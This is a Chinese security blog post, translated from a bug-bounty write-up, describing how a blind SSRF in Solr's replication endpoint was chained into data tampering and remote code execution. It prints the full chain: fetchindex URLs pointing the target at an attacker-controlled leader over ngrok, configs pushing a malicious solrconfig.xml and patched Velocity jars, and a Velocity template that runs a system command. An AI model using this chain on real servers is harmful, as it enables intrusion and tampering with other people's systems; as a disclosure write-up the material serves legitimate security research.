#  Solr服务器上的“花式”远程代码执行（RCE）   
adbc  山石网科安全技术研究院   2025-03-30 09:00  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**从盲SSRF到RCE：如何在Solr服务器上实现数据篡改和代码执行！**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
在网络安全的世界里，漏洞的发现和利用往往充满了曲折和惊喜。今天，我们要分享的是一次极具挑战性的漏洞挖掘经历——如何在一个看似普通的Solr服务器上，通过一系列复杂的操作，最终实现远程代码执行（RCE）。  
这个漏洞不仅考验了技术能力，更考验了耐心和创造力。虽然最终的结果有些不尽如人意，但这段经历绝对值得分享。让我们跟随笔者一起走进这个充满“花式操作”的漏洞故事！  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**一、前期工作**  
  
  
去年，笔者在同一私有项目的不同Solr服务器上发现了三个漏洞，其中部分漏洞已在本博客的  
另一篇文章  
中描述。笔者强烈建议阅读该文，因为它介绍了本文将要讨论的一些Solr核心概念。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxsUrnvfM8SHbZWDedicabCdN5RAY9kejRPn7foaCvdyyaTYzKgAJlBdA/640?wx_fmt=png&from=appmsg "")  
  
  
在此期间，笔者还在其中一个仅存储欧洲区所有商店前端数据（产品名称、价格、链接等）的Solr服务器中发现了一个已知的盲SSRF漏洞  
（CVE-2021-27905）  
。该服务器允许自由查询且不包含任何敏感信息。由于这并非高危漏洞，笔者没有将它上报，而是计划将其作为未来复杂利用链的潜在组件。但最终搁置了这个想法，转向了其他无关项目。  
  
  
数月后（撰写本文的两周前），笔者决定花更多时间在漏洞赏金项目上。首先复查了过往漏洞报告笔记，旨在通过回顾旧案进入状态，为不停地进行渗透测试做好心理准备，而根据经验，心理调节始终是我从事漏洞赏金工作中最具挑战性的环节。  
  
  
带着更积极的心态，笔者回忆起曾在这个已斩获两个高危和一个严重漏洞的项目中留有盲SSRF时，立即决定重新审视。这次笔者将采取更深入的研究方法，全面探究Solr机制。快速验证该盲SSRF仍可利用后，正式开启工作。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**二、认识盲SSRF**  
  
  
首要目标是透彻理解这个最初仅通过常规Solr漏洞扫描发现的盲SSRF。该漏洞位于核心的复制端点"/solr//replication"。Solr中的核心（core）即服务器中的独立数据集，本例中每个语言区域对应一个核心（如"de"代表德语）。触发漏洞的URL示例如下：  
  
```
https://target.com/solr/de/replication?command=fetchindex&leaderUrl=https://attacker.com
```  
  
  
为了深入了解此漏洞涉及的所有功能，需要查阅Solr文档。幸运的是，Apache维护了一个庞大的文档门户，因此很容易找到与索引复制相关的章节。通过文档，可以了解到复制功能允许在多个Solr实例之间构建基础设施，其中“主节点/服务器（leader）”实例将数据副本分发给“从节点/服务器（follower）”实例。主服务器负责数据更新，而从服务器处理查询。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxMc5LQS7JKdKSicabpic3MibibiaI0TU0l9HbezLIJJcxznMEyL5c6fDz6zw/640?wx_fmt=png&from=appmsg "")  
  
  
参与此架构的每个实例都必须启用复制请求处理器（“/replication”），该处理器根据角色（主服务器或从服务器）接受一系列命令。例如，“fetchindex”命令允许从服务器在指定主服务器拉取索引副本。这意味着目标服务器作为从服务器，可以通过“fetchindex”命令指定任意主服务器进行一次性复制。  
  
```
fetchindex Force the specified follower to fetch a copy of the index from its leader.http://_follower_host:port_/solr/_core_name_/replication?command=fetchindex 你可以传递额外的属性，例如 leaderUrl 或 compression（或在“配置从服务器”中描述的任何其他参数），以执行一次性从主服务器复制的操作。这避免了在从服务器配置中硬编码主服务器 URL 的需求。
```  
  
  
  
这意味着目标Solr服务器作为从服务器，可通过"fetchindex"命令指定任意主服务器进行数据复制。  
  
  
这使笔者萌生搭建恶意主服务器向目标注入数据的构想——若能修改该存储欧洲区所有商店数据的服务器，即可操控网站内容！虽然前景诱人，但前路漫漫。  
四处查看后，笔者还了解了其他复制命令，例如 "details"，它可用于获取复制配置：  
  
```
https://target.com/solr/de/replication?command=details
```  
  
  
在这种情况下，服务器返回了一个庞大的 JSON 响应，从这个输出中能够解读出的一点是，服务器还允许其他人从它那里复制数据，这意味着可能可以下载整个数据集。  
  
  
这将非常有用，因为理论上，我们可以直接复制该数据集，插入一个测试条目，然后再将其分发回目标服务器。这样，我们就可以通过查询新添加的条目来证明自己有能力修改数据集，而不会影响公司商店的任何数据。  
  
  
很好。现在的第一步是部署一个本地的Solr实例，并试试看我们是否能够从目标服务器复制数据集。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**三、创建Solr实例**  
  
  
于是，笔者从Solr官网下载了最新的二进制发布版本，并按照他们的部署指南进行操作。这个二进制版本包含一个命令行工具，可以用来启动/停止Solr、管理核心等。这样，我们可以使用以下命令在端口 9000 上启动一个新的 Solr 服务器：  
  
```
$ bin/solr start -p 9000
```  
  
  
当 "start" 命令执行完成后，可以通过"http://127.0.0.1:9000/"访问管理界面。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxc3CMHFlALzz1dDoNO8spIkBOplibgXLqOxRNHWTyZmian6QRibx1m7Uag/640?wx_fmt=png&from=appmsg "")  
  
  
下一步是创建一个核心（core）。以下命令会创建一个名为"hacefresk0"  
的空核心：  
  
```
$ bin/solr create -c hacefresk0
```  
  
  
然后，可以通过select  
请求处理程序对其进行查询：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxaZEXoVGa3wHfHibQDD0XNKz5AqCJtiaAq90l7shd1IUztalNonApG7aQ/640?wx_fmt=png&from=appmsg "")  
  
  
接下来，需要为该核心配置复制（replication）请求处理程序，使其成为目标服务器的从属（follower）。为此，我需要编辑核心的配置文件，文件路径为"server/solr/hacefresk0/conf/solrconfig.xml"  
，并添加以下元素：  
  
```
<requestHandler name="/replication" class="solr.ReplicationHandler"> <lst name="slave"> <str name="leaderUrl">https://target.com/solr/de/</str> <str name="pollInterval">00:00:20</str> </lst> </requestHandler>
```  
  
  
重新启动服务器后，本应该可以使用 `"fetchindex"` 命令在复制端点进行数据集复制。  
然而，服务器返回了以下错误：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxonUdwukaYYNLCgNEgYMibvNNnnt9cIrHqMKnxDZz7HgUhkWuVgDKOrw/640?wx_fmt=png&from=appmsg "")  
  
  
在 Google 搜索了一番后，可以发现 Solr 现在要求指定的"leaderUrl"  
必须被显式加入白名单，或者在启动时使用"-Dsolr.disable.allowUrls=true"  
这个标志。这非常有趣，因为这意味着目标服务器可能也在使用这个标志，尽管Solr警告这并不是一个安全的做法。  
  
  
无论如何，笔者使用以下命令重新启动了服务器：  
  
```
$ bin/solr stop; bin/solr start -p 9000 -Dsolr.disable.allowUrls=true
```  
  
  
然后，再次执行"fetchindex"  
命令，成功从目标服务器复制了数据集！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxOLIxptcPJoY8GT6WGW1TQe4SA7yic8YHqJpiaGtmx985Qp1lVA9kVobQ/640?wx_fmt=png&from=appmsg "")  
  
  
现在可以在本地进行查询了：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxb7ltS24MD8X4GbatTcu9bHRD965IHCE9Mw1tH1xAKp5ia1POtfwoSIg/640?wx_fmt=png&from=appmsg "")  
  
  
请注意，这个数据集是公开的，并不包含任何私人信息，因此，仅凭这一行为本身并不构成漏洞。  
  
  
接下来的步骤是添加一个无害的条目，以证明可以修改数据库。为此，首先使用复制命令"disablepoll"  
停止从目标服务器获取更多数据，因为新的复制操作会覆盖本地的更改。  
  
  
然后，笔者添加了一个 ID 为"1337"  
，标题为"Hacked by hacefresk0"  
的条目。:P  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxBGv1EcxjuHibcuK1YM6icFGtiaP1rRP2K7K519zLew6pkpXv5ZqaeALeg/640?wx_fmt=png&from=appmsg "")  
  
  
此时，已成功复制了目标服务器的数据集，并添加了一个新的1337-elite-hacker记录。接下来，需要检查是否可以将该数据集分发回目标服务器，还是这只是一个无用的尝试。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**四、将数据复制回目标服务器**  
  
  
为了将本地服务器配置为**复制主服务器（replication leader），**  
而不是**从服务器（follower）**  
，我需要修改先前添加到核心配置文件中的**复制请求处理程序（replication request handler）**  
配置，如下所示：  
  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">  <lst name="leader">   <str name="replicateAfter">optimize</str>   <str name="backupAfter">optimize</str>  </lst> </requestHandler>
```  
  
  
然后，重新启动服务器以应用更改，并使用  
ngrok  
将本地主服务器暴露到互联网：  
  
```
$ ngrok http 9000
```  
  
  
为了检查复制主服务器是否正常工作，笔者首先在本地进行了测试，创建了一个名为"replica"  
的新核心，并将其配置为从服务器（follower），指向**ngrok**  
提供的URL：  
  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">   <lst name="slave">     <str name="leaderUrl">https://<ngrok_url>/solr/hacefresk0/</str>     <str name="pollInterval">00:00:20</str>   </lst> </requestHandler>
```  
  
  
执行"fetchindex"  
命令，成功从本地主服务器复制了数据集！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxQzogLsHrZyIl6ia01wa4AsxGUkcN5B9RO9LHz510hDwAFHT9ykIYbDw/640?wx_fmt=png&from=appmsg "")  
  
  
接下来，在目标服务器上执行该操作了,访问以下URL以触发复制：  
  
```
https://target.com/solr/de/replication?command=fetchindex&leaderUrl=https://<ngrok_url>/solr/hacefresk0/
```  
  
  
然而，**ngrok**  
并未收到任何连接。即使重复了这个过程多次，重置了一切，但依然无法让它正常工作。后来，笔者再次执行本地测试，一切正常，但在目标服务器上始终无法成功，因此笔者选择了暂停。  
  
  
后来，在玩游戏的时候，笔者突然想到：**我并不知道目标服务器正在运行的 Solr 版本**  
，也许是版本不匹配导致了复制失败。于是，笔者回去尝试在目标服务器上触发一些错误，看看是否能泄笔者Solr版本信息。最终，我发现目标服务器使用的是**Solr 8.11**  
，此时笔者已经不记得是如何触发错误并获取该版本信息的了，可能是某个复制请求处理程序的报错）。得知这一信息后，笔者立即从  
Solr 官网  
下载了 **Solr 8.11**  
的二进制版本，并开始重建相同的测试环境。  
  
  
当所有环境准备就绪后，笔者再次在目标服务器上触发"fetchindex"  
命令——**成功了！**  
  
  
再次查询之前添加的**1337**  
记录时，它已经出现在目标服务器上，所有人都可以看到：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxibcRnqgTSxCU8ob7sbUbjvVPZESxnibarWhQlviaprw9WlySKb7YArYIA/640?wx_fmt=png&from=appmsg "")  
  
  
这意味着，笔者能够成功**修改该公司所有欧洲门店的数据库**  
，这可以做很多事情，例如**篡改数据、植入恶意链接**  
等等。  
  
  
然而，既然现在已经可以向目标 Solr 服务器分发数据，笔者开始思考——**我还能做些什么**  
？  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**五、修改目标服务器的配置**  
  
  
在研究  
Solr官方文档  
时，笔者注  
意到了**主服务器（leader）**  
配置中的一个参数：  
  
```
confFiles 可选 | 默认值：无要复制到从服务器的配置文件，多个文件用逗号分隔。这些文件应包括像模式（schema）、停用词（stopwords）以及其他可能会在主服务器上更改，并需要在从服务器上更新以便用于查询的配置文件。[...]
```  
  
  
现在可以确定了复制是可行的，笔者进一步调查这个问题。实际上，这个参数允许主服务器指定一组配置文件，这些配置文件与"solrconfig.xml"位于同一目录，并被复制到从服务器。一旦它们被接收，它们就会像服务器重新启动一样被加载。还可以指定这些配置文件在到达从服务器后使用的文件名。我想测试是否能够通过这个参数将任意的配置文件传递到目标服务器。因此，我创建了一个名为"hacefresk0-config.xml"的新文件，它将在目标服务器上重命名为"solrconfig.xml"，从而覆盖其原有的配置文件。为了能够分发这个文件，笔者在本地服务器的复制请求处理程序中添加了相应的"confFiles"元素：  
  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">   <lst name="leader">     <str name="replicateAfter">optimize</str>     <str name="backupAfter">optimize</str>     <str name="confFiles">hacefresk0-config.xml:solrconfig.xml</str>   </lst> </requestHandler>
```  
  
  
  
文件"hacefresk0-config.xml"是Solr 8.11默认的"solrconfig.xml"文件的副本，并进行了些许修改。由于在"details"命令的服务器响应中显示了主服务器URL，笔者添加了一个自定义的URL以检查新的配置是否会成功加载到服务器中。笔者使用的主服务器URL就是当前的那个，它对应公司的一个内部服务器，但显式指定了"443"端口：  
  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">  <lst name="slave">   <str name="leaderUrl">https://leader.target.com:443/solr/de/</str>   <str name="pollInterval">00:00:20</str>  </lst> </requestHandler>
```  
  
  
  
和之前一样，笔者重新启动了本地服务器，并通过"fetchindex"命令在目标服务器上触发了复制。而后在ngrok界面上收到了几个请求，表明复制操作成功执行。当在目标服务器上执行"details"命令时，显示"hacefresk0-config.xml"已经被正确复制，并且主服务器URL现在包含了":443"，这意味着成功地修改了目标服务器的配置！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxgiciclmfibsDAOjeAnicrBOWfvSWVpMMWibkGhejIdOlvyU56kZCKmGgpgw/640?wx_fmt=png&from=appmsg "")  
  
  
下一步是尝试利用这个行为来实现远程代码执行（RCE）。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**六、寻找RCE利用链**  
  
  
在这一点上，笔者开始寻找Solr中已知的RCE漏洞，并调查是否可以通过修改核心配置文件来触发其中的任何一个。除了阅读Solr文档外，笔者还查阅了许多有用的文章，例如  
这篇关于 "Solr 注入" 的文章  
 和   
这篇专门讨论 Solr RCE 的文章  
。  
此外，笔者还查看了[nuclei模板库](https://github.com/search?q=repo%3Aprojectdiscovery%2Fnuclei-templatessolr&type=code)，这是一个很好的漏洞源。结果发现了有许多案例，在旧版本中可以通过配置文件启用危险功能，但之后开发者做了限制，要求只能通过Solr二进制文件或环境变量来管理。例如，  
远程流媒体  
就是一个例子。  
远程流媒体的功能就被限制了。  
另一个大限制是目标服务  
器只允许访问"/select"和"/replication"，这意味着无法使用任何最终依赖于其他请求处理程序的漏洞。  
经历了很多曲折的过程后，笔者最终使用了  
Velocity 模板  
，它是一种非常强大的基于Java的模板，过去曾被用来利用Solr。  
以下是一个简单的例子：  
  
```
<html> <body>    Hello $customer.Name!     <table>      #foreach( $mud in $mudsOnSpecial )         #if ( $customer.hasPurchased($mud) )           <tr>            <td>$flogger.getPromo( $mud )</td>          </tr>        #end       #end     </table></body></html>
```  
  
  
在旧版本中，可以使用"/config"的配置请求处理程序启用Velocity引擎，并提供自定义模板来实现RCE。当开发者发现后，他们将其管理限制为只能通过"solrconfig.xml"配置文件来处理。笔者考虑到可以修改目标服务器的配置文件，这个情况似乎非常合适。然而，有一个小问题。当前版本中，运行Velocity引擎所需的.jar库默认不再与Solr捆绑在一起，因为从9.0版本开始，它已被弃用，因此需要手动添加这些库。为了做到这一点，这些.jar文件必须放在Solr可访问的目录中，并在配置文件中进行引用。这似乎是个死胡同，但笔者突然想到一个点。也许，如果能够将任意配置文件传送到目标服务器，那么也许能够传送.jar文件。由于它们是通过"solrconfig.xml"加载的，如果可以修改这个文件，那么我们就能够在目标服务器上启用Velocity引擎。首先，需要找到这些.jar文件:D。它们可以在  
第三方 Solr 插件的 GitHub 仓库  
中找到，该插件目前"替代"了Velocity引擎。  
于是，笔者下载了.jar文件并开始设置我的本地测试环境，检查是否能够从主服务器复制它们到从服务器。接着，  
启动了两个Solr实例：  
一个主服务器和一个从服务器。笔者  
将Velocity.jar文件复制到与主服务器的"solrconfig.xml"文件相同的目录中（即"server/solr/leader/conf/"），并将其配置为在复制时分发这些文件：  
  
  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">   <lst name="leader">     <str name="replicateAfter">optimize</str>     <str name="backupAfter">optimize</str>     <str name="confFiles">solritas-0.9.5.jar,velocity-engine-core-2.1.jar,velocity-tools-generic-3.0.jar</str>   </lst> </requestHandler>
```  
  
  
对于从服务器，笔者配置了一个简单的从服务器复制请求处理程序，指向主服务器实例：  
  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">   <lst name="slave">     <str name="leaderUrl">http://localhost:9000/solr/leader/</str>     <str name="pollInterval">00:00:20</str>   </lst> </requestHandler>
```  
  
  
笔者向主服务器中添加了一些测试数据，以便它有东西可以复制（否则，复制操作将无法执行），并在从服务器实例上执行了"fetchindex"命令。结果，.jar文件成功地从主服务器分发到了从服务器！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxoOMcYnGJiby6WNM2BWyav8eOxRYqVFVm47LsULeV9EW8DzS3w7Zr8Zw/640?wx_fmt=png&from=appmsg "")  
  
  
一旦确定可以分发.jar库，我们需要测试是否能够使用它们实际启用Velocity。由于目前已经知道可以远程修改配置文件，为了节省时间，笔者手动编辑了从服务器的solrconfig.xml  
。  
笔者  
添加了一个<lib>  
元素来导入server/solr/follower/conf/  
目录中的所有.jar库，并添加了一个<queryResponseWriter>  
元  
素来启用Velocity：  
  
```
<lib dir="conf/" regex=".*\.jar"/><queryResponseWriter name="velocity" class="solr.VelocityResponseWriter">    <str name="template.base.dir"></str></queryResponseWriter>
```  
  
  
然后，笔者重启了服务器，并访问了/select?q=1&wt=velocity&v.template=browse&v.layout=layout  
，成功渲染了默认的Velocity模板"browse"，这意味着Velocity已被启用。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2ox3fVria98hAzoiacgR0faHicc8iaqMKjvDcEBOZZPUNCzic7UsBMbCO45Nibw/640?wx_fmt=png&from=appmsg "")  
  
  
到目前为止，笔者已经能够通过分发必要的.jar库和自定义solrconfig.xml  
来启用Velocity。  
现在唯一缺少的部分是提供一个恶意的V  
elocity模板，以实现远程代码执行（RCE）。  
在旧版本中，一旦Velocity被启用，可以直接通过/select  
请求  
处理器的URL参数执行自定义模板，类似于之前渲染默认"browse"模板的方式。  
然而，当我尝试这样做时，发现现在Velocity仅支持从本地文件系统加载模板。  
  
  
由于目前已经能够传输任意文件，这并不成问题，因此笔者直接创建了一个恶意模板，并在本地服务器上进行测试，以检查是否真的可以实现RCE。笔者创建了一个简单的模板，它会在服务器上执行id  
命令，并将其保存为server/solr/follower/conf/velocity/rce.vm  
：  
  
```
#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])     $str.valueOf($chr.toChars($out.read())) #end
```  
  
  
  
接着重启服务器，并访问了/select?q=1&wt=velocity&v.template=rce  
以渲染该模板，但它并没有执行  
id  
命令。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2ox2PWJmcukbWID7P2jlXTDDjFxn70tjpNUvdPmjNT4ZYMmRxLgrZ1wrQ/640?wx_fmt=png&from=appmsg "")  
  
  
在多次检查模板语法是否正确并花费数小时搜索后，笔者**勉强理解**  
了它没有正确执行的原因。看起来Velocity引擎被配置为**不允许实例化新类**  
（与一个名为SecureUberspector  
的内部类有关，详情见  
此问题  
。这意味着$x.class.forName()  
的调用根本  
没有被执行。到  
了这  
个阶段，笔者已经没有新的思路，于是再次休息了几天。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**七、****破解Velocity限制**  
****  
  
  
某天晚上，笔者重新查看笔记时，想到或许可以在  
Velocity 插件的 GitHub 仓库  
里  
找到一些答案，因为那里也包含了Velocity.jar文件的Java代码。笔者搜索了"SecureUberspector"，惊讶地发现了两个结果：  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxxc1cZOGcxhrzicYJ48RC0HgiaoZ9z22UiaAJQem7kUiadWazUbIYtVWzGQ/640?wx_fmt=png&from=appmsg "")  
  
其中一个结果位于solr-velocity/src/main/java/org/apache/solr/response/VelocityResponseWriter.java  
，它正是**负责禁用新类实例化的代码**  
！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxMBZgF4icib8SfrksnG0ibJXWBCfJZbAu081tBqYj5ibqMUMXGLKQasVukA/640?wx_fmt=png&from=appmsg "")  
  
  
这太让人兴奋了！也许可以**删除这些限制代码并重新编译.jar文件**  
，这样Velocity引擎就没有这些限制了。经过一些尝试和修复pom.xml  
文件中的一个依赖问题后，  
成功重新编译了.jar文件。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2ox7sQibbfqtyxcdMyzrgU0vThoAjpnzAgUcNxeibgGhGicEcZD4C7zKQEFg/640?wx_fmt=png&from=appmsg "")  
  
  
笔者将这些新的Velocity库替换到了本地Solr实例中（这个实例已经在之前的测试中配置好了Velocity），然后再次访问/select?q=1&wt=velocity&v.template=rce  
渲染rce.vm  
模板：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxmZbbUp4dIXzwQRmH002GKoVSXV5AfiaGWz2ib9uqicpsRkSMzeQedcYXw/640?wx_fmt=png&from=appmsg "")  
  
  
成功了！现在有了一个理论上可行的RCE漏洞利用方案！接下来，需要在目标服务器上进行测试。  
  
   
  
既然现在已经可以重新编译Velocity插件并分发自定义.jar库，那么如果**直接修改默认的"browse"模板**  
（该模板内置于.jar文件中）会更酷，这样就**不需要额外传输恶意模板**  
了。因此，笔者编辑了src/main/resources/browse.vm  
模板，并创建了一个Poc来执行id  
命令，以证明笔者能够在目标服务器上进行RCE：  
  
```
<title>Hacked by hacefresk0</title> <h1>Hacked by hacefresk0</h1> <br> <pre> #set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])	$str.valueOf($chr.toChars($out.read()))#end </pre>
```  
  
  
  
  
笔者重新编译了.jar库并准备了漏洞利用代码。总结一下，实现目标服务器RCE的步骤如下：  
  
  
1.搭建一个恶意的本地Solr服务器，使其作为目标服务器的从服务器。  
  
2.复制目标Solr服务器的数据集，以防丢失原始数据。  
  
3.将本地服务器配置为主服务器，分发恶意的solrconfig.xml  
文件和修改后的Velocity.jar库，同时提供数据集。  
  
4.触发本地服务器向目标服务器进行数据复制。  
  
5.访问目标服务器上被修改的"browse"模板，从而执行  
id  
命令。  
  
  
由于笔者的本地Solr实例"hacefresk0"已经包含了目标服务器的数据集，于是笔者将其复制请求处理器（replicationrequesthandler）配置为**主服务器**  
，用于为目标服务器提供恶意的solrconfig.xml  
文件和修改后的Velocity.jar库：  
  
  
  
```
<requestHandler name="/replication" class="solr.ReplicationHandler">     <lst name="leader">         <str name="replicateAfter">optimize</str>         <str name="backupAfter">optimize</str>         <str name="confFiles">malicious-solrconfig.xml:solrconfig.xml,solritas-0.9.5.jar,velocity-engine-core-2.1.jar,velocity-tools-generic-3.0.jar</str>     </lst> </requestHandler>
```  
  
  
  
  
这个恶意的solrconfig.xml  
包含了：  
  
一个<lib>  
元素，用  
于导入.jar库。  
  
  
一个<queryResponseWriter>  
元素，用于启用Velocity。  
  
  
一个复制请求处理器（replicationrequesthandler），配置为目标服务器当前主服务器的**从服务器**  
，这样就不会严重破坏目标服务器的复制机制：  
  
```
<lib dir="conf/" regex=".*\.jar"/> <queryResponseWriter name="velocity" class="solr.VelocityResponseWriter">    <str name="template.base.dir"></str></queryResponseWriter><requestHandler name="/replication" class="solr.ReplicationHandler">    <lst name="slave">        <str name="leaderUrl">https://leader.target.com:443/solr/de/</str>        <str name="pollInterval">00:00:20</str>    </lst></requestHandler>
```  
  
  
  
然后，笔者访问了以下URL来复制目标服务器：  
  
```
https://target.com/solr/de/replication?command=fetchindex&leaderUrl=https://<ngrok_url>/solr/hacefresk0/
```  
  
  
  
当在ngrok界面上看到相应的链接，确认复制成功后，笔者访问了目标服务器上的恶意"browse"模板："https://target.com/solr/de/select?q=\*&wt=velocity&v.template=browse".成功了！服务器成功执行了id  
命令！:D  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnTiaLZvVnPXEED5JBmflm2oxo5djK0eXk43vlyED2efCMJ4m3vtGA6siabNjZxggsU0JoekX6tlT0ZA/640?wx_fmt=png&from=appmsg "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**八、报告与总结**  
  
****  
笔者向该公司的漏洞赏金计划（bugbountyprogram）报告了这个RCE，希望能获得可观的奖励。然而，几天后，他们决定将该报告标记为重复（Duplicated），这让笔者觉得非常奇怪。虽然笔者无法看到这个报告的原始版本，但它的漏洞严重程度被标记为9.1，并且已经开放了4个月。而且，在笔者提交报告后，/replication  
站点立刻被关闭，这让笔者怀疑之前的报告并没有真正证明RCE可行。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**九、相关链接**  
  
  
2025年2月26日 - web, bugbounties 。  
  
原文链接：https://www.hacefresko.com/posts/rce-on-solr-server-via-replication。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
